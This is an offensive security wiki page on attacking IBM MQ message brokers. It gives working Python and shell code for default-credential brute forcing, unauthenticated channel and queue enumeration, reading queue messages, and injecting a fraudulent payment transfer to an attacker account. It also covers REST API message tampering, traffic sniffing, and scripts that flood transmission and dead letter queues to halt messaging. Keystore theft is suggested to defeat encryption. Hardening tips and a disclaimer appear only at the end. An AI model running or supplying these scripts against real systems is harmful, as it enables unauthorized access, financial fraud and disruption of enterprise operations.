---
title: "IBM MQ"
date: 2026-02-24
draft: false
---

## Overview

IBM MQ (formerly MQSeries, WebSphere MQ) is an enterprise message-oriented middleware platform used in banking, finance, and large enterprise environments for reliable, transactional message delivery between applications. Exposed IBM MQ ports can enable attackers to enumerate queues, read and inject messages into business-critical message flows, and potentially escalate to application-level compromise. The protocol is binary but well-documented; several tools exist for security testing.

> **End of Support Notice (2026):** IBM MQ 9.1 and 9.2 have reached End of Support. CVE-2021-38920 and similar vulnerabilities disclosed during their support window are critical for organizations still running these versions, as no further patches will be released. Current supported versions are **9.3 LTS** and **10.0**. If the target is running 9.1 or 9.2, treat all known CVEs as unpatched.

**Default Ports:**
| Port | Service |
|------|---------|
| 1414 | IBM MQ Queue Manager listener (default) |
| 1415 | Secondary MQ listener |
| 9443 | MQ Console (HTTPS) |
| 9080 | MQ Console (HTTP) |

---

## Architecture Overview

| Component | Role |
|-----------|------|
| Queue Manager (QM) | Central broker managing queues |
| Channel | Named connection endpoint (server-connection, sender, receiver, etc.) |
| Queue | Message storage (LOCAL, REMOTE, ALIAS, MODEL) |
| Message | Unit of data transferred |
| CHLAUTH | Channel authentication rules |
| MCA (Message Channel Agent) | Handles channel connections |

---

## Recon and Fingerprinting

### Nmap

```bash
nmap -sV -p 1414,1415,9443,9080 TARGET_IP

# Check banner
printf "" | nc TARGET_IP 1414

# Detailed service probe
nmap -sV -p 1414 --version-intensity 9 TARGET_IP
```

### MQ Console Discovery

```bash
# Check for MQ Web Console
curl -k -sv https://TARGET_IP:9443/ibmmq/console/ 2>&1 | grep -iE "ibm mq|console|login"
curl -sv http://TARGET_IP:9080/ibmmq/console/ 2>&1 | grep -iE "ibm mq|console"

# Default credentials
for cred in "admin:admin" "admin:password" "mqadmin:mqadmin" "admin:passw0rd" "mq:mq"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -u "$user:$pass" \
    "https://TARGET_IP:9443/ibmmq/console/")
  echo "$cred -> $CODE"
done
```

---

## Default Channel Exposure — SYSTEM.DEF.SVRCONN

IBM MQ ships with a default server-connection channel named `SYSTEM.DEF.SVRCONN`. In misconfigured installations, this channel:
- Requires no authentication (MCAUSER is blank or uses OS user)
- Has no CHLAUTH rules blocking anonymous connections
- Allows full queue access

### Check Channel Availability with pymqi

```python
#!/usr/bin/env python3
"""
IBM MQ channel probe — tests for unauthenticated access
"""
import pymqi
import sys

QM = "QMGR1"  # Queue Manager name (may need to enumerate)
TARGET = "TARGET_IP"
PORT = 1414
CHANNELS = [
    "SYSTEM.DEF.SVRCONN",
    "SYSTEM.AUTO.SVRCONN",
    "SYSTEM.ADMIN.SVRCONN",
    "CLIENT.CONN",
    "SVRCONN.CHANNEL",
]

def test_channel(target, port, qm, channel, user=None, password=None):
    conn_info = f"{target}({port})"
    try:
        if user:
            cd = pymqi.CD()
            cd.ChannelName = channel.encode()
            cd.ConnectionName = conn_info.encode()
            cd.ChannelType = pymqi.CMQC.MQCHT_CLNTCONN
            sco = pymqi.SCO()
            sco.CertificateLabel = b""
            qmgr = pymqi.connect(qm, cd, conn_info, user=user, password=password)
        else:
            qmgr = pymqi.connect(qm, channel, conn_info)

        print(f"[+] CONNECTED: {channel} (auth: {'yes' if user else 'no'})")
        qmgr.disconnect()
        return True
    except pymqi.MQMIError as e:
        reason = e.reason
        comp = e.comp
        print(f"[-] {channel}: {e} (Reason: {reason}, Comp: {comp})")
        return False

for ch in CHANNELS:
    test_channel(TARGET, PORT, QM, ch)
```

### Queue Manager Name Enumeration

The queue manager name is required for connection. Common names to try:

```
QMGR, QM1, QM2, PROD.QM, DEV.QM, IBM.MQ.QM, DEFAULT.QM, APPQM, MAINQM, MQ, QUEUES
```

```python
import pymqi

TARGET = "TARGET_IP"
PORT = 1414
CHANNEL = "SYSTEM.DEF.SVRCONN"
CONN_INFO = f"{TARGET}({PORT})"

QM_NAMES = ["QMGR1", "QM1", "QM", "PROD", "DEV", "TEST", "MQ1", "IBM.MQ", "MAINQM", "APP"]

for qm in QM_NAMES:
    try:
        conn = pymqi.connect(qm, CHANNEL, CONN_INFO)
        print(f"[+] Queue Manager found: {qm}")
        conn.disconnect()
        break
    except pymqi.MQMIError as e:
        if e.reason == pymqi.CMQC.MQRC_Q_MGR_NAME_ERROR:
            print(f"[-] QM not found: {qm}")
        else:
            # Note: CHAD(ENABLED) changes blind enumeration behavior
            # With CHAD enabled, error may be a generic authorization error
            # rather than MQRC_Q_MGR_NAME_ERROR, making enumeration harder
            print(f"[?] {qm}: reason={e.reason} (may be CHAD-enabled — ambiguous response)")
```

**CHAD(ENABLED) Edge Case:** When the Queue Manager has `CHAD(ENABLED)` configured (Channel Authentication Data), failed connections due to wrong QM name or access denial may both return a generic authorization error code rather than the specific `MQRC_Q_MGR_NAME_ERROR`. This means blind enumeration of QM names becomes unreliable — you cannot distinguish "QM name not found" from "QM found but access denied." Account for this ambiguity in your enumeration logic.

---

## Unauthenticated Queue Access

Once connected, enumerate and access queues:

```python
#!/usr/bin/env python3
"""
IBM MQ queue enumeration and message reading
"""
import pymqi
from pymqi import CMQCFC

TARGET = "TARGET_IP"
PORT = 1414
CHANNEL = "SYSTEM.DEF.SVRCONN"
QM = "QMGR1"

qmgr = pymqi.connect(QM, CHANNEL, f"{TARGET}({PORT})")
print(f"[+] Connected to {QM}")

# PCF command to list all local queues
pcf = pymqi.PCFExecute(qmgr)

try:
    # List all local queues
    attrs = {CMQCFC.MQCACF_Q_NAME: b"*",
             CMQCFC.MQIA_Q_TYPE: pymqi.CMQC.MQQT_ALL}
    response = pcf.MQCMD_INQUIRE_Q_NAMES(attrs)
    print("[+] Queues:")
    for q in response:
        if CMQCFC.MQCACF_Q_NAMES in q:
            for name in q[CMQCFC.MQCACF_Q_NAMES]:
                print(f"  - {name.decode().strip()}")
except Exception as e:
    print(f"[-] Queue list failed: {e}")

# List channels
try:
    attrs = {CMQCFC.MQCACH_CHANNEL_NAME: b"*"}
    response = pcf.MQCMD_INQUIRE_CHANNEL_NAMES(attrs)
    print("[+] Channels:")
    for c in response:
        if CMQCFC.MQCACH_CHANNEL_NAMES in c:
            for name in c[CMQCFC.MQCACH_CHANNEL_NAMES]:
                print(f"  - {name.decode().strip()}")
except Exception as e:
    print(f"[-] Channel list failed: {e}")

qmgr.disconnect()
```

---

## Message Interception and Injection

### Reading Messages from Queues

```python
#!/usr/bin/env python3
"""
Read messages from IBM MQ queues (non-destructive browse)
"""
import pymqi

TARGET = "TARGET_IP"
PORT = 1414
CHANNEL = "SYSTEM.DEF.SVRCONN"
QM = "QMGR1"
QUEUE_NAME = "TARGET.QUEUE"  # Replace with discovered queue name

qmgr = pymqi.connect(QM, CHANNEL, f"{TARGET}({PORT})")

try:
    queue = pymqi.Queue(qmgr, QUEUE_NAME,
                        pymqi.CMQC.MQOO_INPUT_SHARED | pymqi.CMQC.MQOO_BROWSE)

    gmo = pymqi.GMO()
    gmo.Options = pymqi.CMQC.MQGMO_BROWSE_NEXT
    gmo.WaitInterval = 2000  # 2 second wait

    msg_count = 0
    while True:
        try:
            md = pymqi.MD()
            message = queue.get(None, md, gmo)
            msg_count += 1
            print(f"\n[+] Message {msg_count}:")
            print(f"  MsgId: {md.MsgId.hex()}")
            print(f"  Format: {md.Format}")
            print(f"  PutTime: {md.PutTime}")
            print(f"  Content ({len(message)} bytes): {message[:500]}")
        except pymqi.MQMIError as e:
            if e.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
                print(f"\n[*] No more messages (total: {msg_count})")
                break
            raise

    queue.close()
except Exception as e:
    print(f"[-] Error: {e}")

qmgr.disconnect()
```

### Injecting Messages into Queues

```python
#!/usr/bin/env python3
"""
Inject a message into an IBM MQ queue
"""
import pymqi
import json

TARGET = "TARGET_IP"
PORT = 1414
CHANNEL = "SYSTEM.DEF.SVRCONN"
QM = "QMGR1"
QUEUE_NAME = "PAYMENT.QUEUE"  # Example — replace with target queue

# Crafted payload (example for financial transaction)
PAYLOAD = json.dumps({
    "transactionType": "TRANSFER",
    "amount": "99999.99",
    "targetAccount": "ATTACKER_ACCOUNT",
    "currency": "USD"
})

qmgr = pymqi.connect(QM, CHANNEL, f"{TARGET}({PORT})")

try:
    queue = pymqi.Queue(qmgr, QUEUE_NAME, pymqi.CMQC.MQOO_OUTPUT)
    md = pymqi.MD()
    md.Format = pymqi.CMQC.MQFMT_STRING
    pmo = pymqi.PMO()
    queue.put(PAYLOAD.encode(), md, pmo)
    print(f"[+] Injected message into {QUEUE_NAME}")
    queue.close()
except Exception as e:
    print(f"[-] Put failed: {e}")

qmgr.disconnect()
```

---

## CVE-2021-38920 — Information Disclosure

**CVSS:** 5.3 Medium
**Affected:** IBM MQ 9.1, 9.2
**Type:** Information disclosure in MQ Console
**CWE:** CWE-200

An authenticated user with limited privileges could access API endpoints in the MQ Console that disclosed information about queue managers, channels, and configurations beyond their authorized scope. Combined with weak default credentials, this can lead to full topology enumeration.

```bash
# Check MQ Console REST API endpoints (requires auth)
curl -sk -u admin:admin https://TARGET_IP:9443/ibmmq/rest/v1/admin/qmgr
curl -sk -u admin:admin https://TARGET_IP:9443/ibmmq/rest/v1/admin/queue?queueManager=QMGR1
curl -sk -u admin:admin https://TARGET_IP:9443/ibmmq/rest/v1/admin/channel?queueManager=QMGR1
curl -sk -u admin:admin https://TARGET_IP:9443/ibmmq/rest/v1/admin/subscription?queueManager=QMGR1
```

---

## MQ Channel Sniffing

MQ traffic on port 1414 is unencrypted by default. A network-position attacker can capture and decode MQ messages.

> **TLS Note (2026):** In current IBM MQ versions, TLS 1.0 and TLS 1.1-based CipherSpecs are **disabled by default**. SHA-1-based TLS 1.2 CipherSpecs (e.g., `TLS_RSA_WITH_AES_128_CBC_SHA`) are also being phased out as defaults. If the target channel is TLS-enabled, confirm which CipherSpec is configured — sniffing TLS 1.2+ traffic requires the session key (e.g., via `SSLKEYFILE` export or compromised certificate). Unencrypted channels (no `SSLCIPH` configured) remain directly readable.

### Wireshark Filter

```
# Wireshark display filter for IBM MQ
tcp.port == 1414

# MQ dissector is built into Wireshark
# Filter for PUT operations
ibmmq.opcode == 0xF4

# Filter for GET operations
ibmmq.opcode == 0xF2
```

### tshark Capture

```bash
# Capture MQ traffic and extract message content
tshark -i eth0 -f "tcp port 1414" \
  -T fields \
  -e frame.time \
  -e ip.src \
  -e ip.dst \
  -e ibmmq.opcode \
  -e data \
  -Y "ibmmq"

# Raw capture for offline analysis
tcpdump -i eth0 -w mq_capture.pcap port 1414
```

---

## mqaudit — IBM MQ Security Assessment Tool

```bash
# Install mqaudit
git clone https://github.com/ernw/mqaudit.git
cd mqaudit

# Install dependencies
pip3 install -r requirements.txt

# Basic scan
python3 mqaudit.py -host TARGET_IP -port 1414 -qm QMGR1

# Full audit with channel list
python3 mqaudit.py -host TARGET_IP -port 1414 -qm QMGR1 -channel SYSTEM.DEF.SVRCONN -verbose

# Generate report
python3 mqaudit.py -host TARGET_IP -port 1414 -qm QMGR1 -output report.html
```

---

## Full Enumeration Script

```python
#!/usr/bin/env python3
"""
Complete IBM MQ security assessment
"""
import pymqi
from pymqi import CMQCFC
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1414
QM = sys.argv[3] if len(sys.argv) > 3 else "QMGR1"
CHANNEL = "SYSTEM.DEF.SVRCONN"

def connect(target, port, qm, channel, user=None, pwd=None):
    conn_info = f"{target}({port})"
    try:
        if user:
            cd = pymqi.CD()
            cd.ChannelName = channel.encode()
            cd.ConnectionName = conn_info.encode()
            qmgr = pymqi.connect(qm, cd, conn_info, user=user, password=pwd)
        else:
            qmgr = pymqi.connect(qm, channel, conn_info)
        return qmgr
    except Exception as e:
        return None

def list_queues(qmgr):
    pcf = pymqi.PCFExecute(qmgr)
    try:
        resp = pcf.MQCMD_INQUIRE_Q_NAMES({CMQCFC.MQCACF_Q_NAME: b"*"})
        queues = []
        for r in resp:
            if CMQCFC.MQCACF_Q_NAMES in r:
                queues.extend([n.decode().strip() for n in r[CMQCFC.MQCACF_Q_NAMES]])
        return queues
    except Exception:
        return []

def list_channels(qmgr):
    pcf = pymqi.PCFExecute(qmgr)
    try:
        resp = pcf.MQCMD_INQUIRE_CHANNEL_NAMES({CMQCFC.MQCACH_CHANNEL_NAME: b"*"})
        channels = []
        for r in resp:
            if CMQCFC.MQCACH_CHANNEL_NAMES in r:
                channels.extend([n.decode().strip() for n in r[CMQCFC.MQCACH_CHANNEL_NAMES]])
        return channels
    except Exception:
        return []

def check_queue_depth(qmgr, queue_name):
    try:
        q = pymqi.Queue(qmgr, queue_name.encode(), pymqi.CMQC.MQOO_INQUIRE)
        attrs = q.inquire(pymqi.CMQC.MQIA_CURRENT_Q_DEPTH)
        q.close()
        return attrs
    except Exception:
        return -1

print(f"[*] Testing {TARGET}:{PORT} QM={QM}")
qmgr = connect(TARGET, PORT, QM, CHANNEL)

if not qmgr:
    print("[-] No unauthenticated access. Trying default credentials...")
    for cred in [("admin", "admin"), ("mqm", "mqm"), ("admin", "passw0rd")]:
        qmgr = connect(TARGET, PORT, QM, CHANNEL, cred[0], cred[1])
        if qmgr:
            print(f"[+] Connected with {cred[0]}:{cred[1]}")
            break

if qmgr:
    queues = list_queues(qmgr)
    print(f"[+] Found {len(queues)} queues")
    for q in queues:
        depth = check_queue_depth(qmgr, q)
        print(f"  Queue: {q} (depth: {depth})")

    channels = list_channels(qmgr)
    print(f"[+] Found {len(channels)} channels")
    for c in channels:
        print(f"  Channel: {c}")

    qmgr.disconnect()
else:
    print("[-] All connection attempts failed")
```

---

## AMS — Advanced Message Security

IBM MQ's Advanced Message Security (AMS) feature encrypts messages at the application layer using PKCS#7 (CMS — Cryptographic Message Syntax). When AMS is enabled on a queue, messages are encrypted **at rest in the queue** and only the intended recipient (identified by DN in their certificate) can decrypt them. This means that even an attacker with full queue access via a compromised channel will only see ciphertext.

### Detecting AMS Presence

```bash
# Check if AMS is installed and active (if you have shell access to the MQ host)
# AMS is part of the DataPower Gateway integration / Advanced Message Security component
ls /opt/mqm/gskit8/ 2>/dev/null       # GSKIT required for AMS
ls /opt/mqm/amsbins/ 2>/dev/null      # AMS binaries

# Via MQ PCF command — check queue security policy
# (requires MQ admin access)
echo "DISPLAY QMGR SSLKEYR" | runmqsc QMGR_NAME
echo "DISPLAY POLICY(*) ALL" | runmqsc QMGR_NAME

# From the attacking side: attempt to read a message
# If content is binary/PKCS#7 blob rather than plaintext, AMS is likely active
# PKCS#7 CMS messages start with: 30 82 (ASN.1 SEQUENCE tag)
python3 -c "
import pymqi
qmgr = pymqi.connect('QMGR_NAME', 'SYSTEM.DEF.SVRCONN', 'TARGET_IP(1414)')
q = pymqi.Queue(qmgr, 'TARGET.QUEUE', pymqi.CMQC.MQOO_INPUT_SHARED | pymqi.CMQC.MQOO_BROWSE)
gmo = pymqi.GMO()
gmo.Options = pymqi.CMQC.MQGMO_BROWSE_FIRST
md = pymqi.MD()
msg = q.get(None, md, gmo)
print(f'First 4 bytes: {msg[:4].hex()}')
# 3082 = ASN.1 SEQUENCE — indicates PKCS#7/CMS encrypted payload
q.close()
qmgr.disconnect()
"
```

### Implications for Attack Chain

- AMS breaks the message interception attack: queue access alone is insufficient for reading message content
- To decrypt AMS-protected messages, the attacker needs the recipient's private key (stored in a keystore on the consumer application host)
- Pivot the attack to the consumer application host to steal the AMS keystore (`kdb` file) and its password
- Alternatively, focus on queues where AMS is NOT configured — AMS is typically applied selectively to high-value queues (payment, PII), not all queues

---

## Administrative REST API

The IBM MQ REST API (port 9443) is an often-overlooked attack surface. It provides full queue management capabilities via HTTP/JSON and may use different credentials from the MQ channel authentication.

```bash
# Administrative REST API — queue manager enumeration
curl -k -u admin:admin https://TARGET_IP:9443/ibmmq/rest/v1/admin/qmgr

# List queues on a specific queue manager
curl -k -u admin:admin https://TARGET_IP:9443/ibmmq/rest/v1/messaging/qmgr/QMGR_NAME/queue

# List channels
curl -k -u admin:admin https://TARGET_IP:9443/ibmmq/rest/v1/admin/channel?queueManager=QMGR_NAME

# Get queue depth via REST API
curl -k -u admin:admin \
  "https://TARGET_IP:9443/ibmmq/rest/v1/admin/queue?queueManager=QMGR_NAME&name=*&status=*"

# Read message via REST API (messaging endpoint)
curl -k -u admin:admin \
  -H "ibm-mq-rest-csrf-token: " \
  "https://TARGET_IP:9443/ibmmq/rest/v1/messaging/qmgr/QMGR_NAME/queue/TARGET.QUEUE/message"

# Put message via REST API
curl -k -u admin:admin -X POST \
  -H "Content-Type: text/plain" \
  -H "ibm-mq-rest-csrf-token: " \
  --data "malicious message payload" \
  "https://TARGET_IP:9443/ibmmq/rest/v1/messaging/qmgr/QMGR_NAME/queue/TARGET.QUEUE/message"
```

**Note:** REST API credentials may differ from MQ channel credentials. The REST API uses the WebSphere Liberty Profile user registry (typically `mqwebuser.xml`) while MQ channel auth uses OS-level users or CHLAUTH rules. Test both credential sets independently.

---

## DoS via Queue Flooding

Filling specific queues can halt enterprise messaging without crashing the Queue Manager process itself. This is a stealthy DoS that may not trigger basic service monitoring.

```bash
# Flood a transmission queue (XMITQ) — halts message delivery to remote QMs
python3 -c "
import pymqi

qmgr = pymqi.connect('QMGR_NAME', 'SYSTEM.DEF.SVRCONN', 'TARGET_IP(1414)')
q = pymqi.Queue(qmgr, 'XMIT.QUEUE.NAME', pymqi.CMQC.MQOO_OUTPUT)
md = pymqi.MD()
md.Format = pymqi.CMQC.MQFMT_STRING

payload = b'X' * 4194304  # 4MB messages
for i in range(500):       # Fill queue to capacity
    pmo = pymqi.PMO()
    q.put(payload, md, pmo)
    if i % 50 == 0:
        print(f'[*] Sent {i} messages')

q.close()
qmgr.disconnect()
print('[+] Transmission queue flooded — remote delivery halted')
"

# Flood the Dead Letter Queue (DLQ) — SYSTEM.DEAD.LETTER.QUEUE
# When DLQ is full, MQ cannot route failed messages → complete messaging halt
python3 -c "
import pymqi

qmgr = pymqi.connect('QMGR_NAME', 'SYSTEM.DEF.SVRCONN', 'TARGET_IP(1414)')
q = pymqi.Queue(qmgr, 'SYSTEM.DEAD.LETTER.QUEUE', pymqi.CMQC.MQOO_OUTPUT)
md = pymqi.MD()
md.Format = pymqi.CMQC.MQFMT_STRING

for i in range(1000):
    pmo = pymqi.PMO()
    q.put(b'FLOOD' * 1000, md, pmo)

q.close()
qmgr.disconnect()
print('[+] DLQ flooded')
"
```

When the DLQ or a transmission queue reaches its `MAXDEPTH`, the Queue Manager starts returning `MQRC_Q_FULL` to all applications trying to put messages, effectively stopping the entire message flow without any MQ process crashing. This may go undetected by process monitoring tools.

---

## Kubernetes and OpenShift Context

In 2026, the majority of IBM MQ deployments run in containers. The IBM MQ Operator for Kubernetes and OpenShift is the standard deployment method. This changes the attack surface:

```bash
# In K8s/OpenShift environments, MQ is typically exposed via:
# - Ingress with TLS passthrough (port 443 → 1414 SNI routing)
# - OpenShift Route with passthrough termination
# - LoadBalancer Service on port 1414

# Attackers must use the correct SNI to reach the right Queue Manager
# SNI is typically the Queue Manager hostname configured in the Route/Ingress

# Enumerate K8s MQ services (if you have cluster access)
kubectl get svc -A | grep -iE "mq|1414|9443"
kubectl get routes -A | grep -iE "mq|ibmmq"

# Connect to K8s-exposed MQ with SNI
# Most MQ clients (pymqi, mqaudit) support this via SSL config
# The connection string uses the external hostname

# Check if MQ Console is exposed via Ingress
curl -k "https://mq.example.com/ibmmq/console/"

# Identify QM name from Kubernetes ConfigMap/Secret (if cluster-accessible)
kubectl get configmap -A -o yaml | grep -iE "qmgr|queue.manager"
kubectl get secret -A | grep -iE "mq|tls"
```

**Key difference from traditional deployments:** In container environments, the MQ port may not be directly accessible — the entry point is often HTTPS (443) with SNI passthrough routing to the MQ listener. The attacker must resolve the correct hostname/SNI to reach the target Queue Manager.

---

## Hardening Recommendations

- Remove or rename `SYSTEM.DEF.SVRCONN` — create named channels only
- Implement CHLAUTH rules to restrict source IPs and require authentication
- Set `MCAUSER` to a specific OS user account (not blank)
- Enable TLS for all MQ channels (`SSLCIPH` setting)
- Use IBM MQ's built-in Object Authority Manager (OAM) for queue-level ACLs
- Restrict which users can connect via the `CONNAUTH` queue manager attribute
- Disable MQ Console if not needed, or restrict to localhost
- Upgrade to IBM MQ 9.3+ and apply latest fix packs
- Monitor queue depth changes and unusual message patterns
- Enable MQ security event logging and ship to SIEM


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.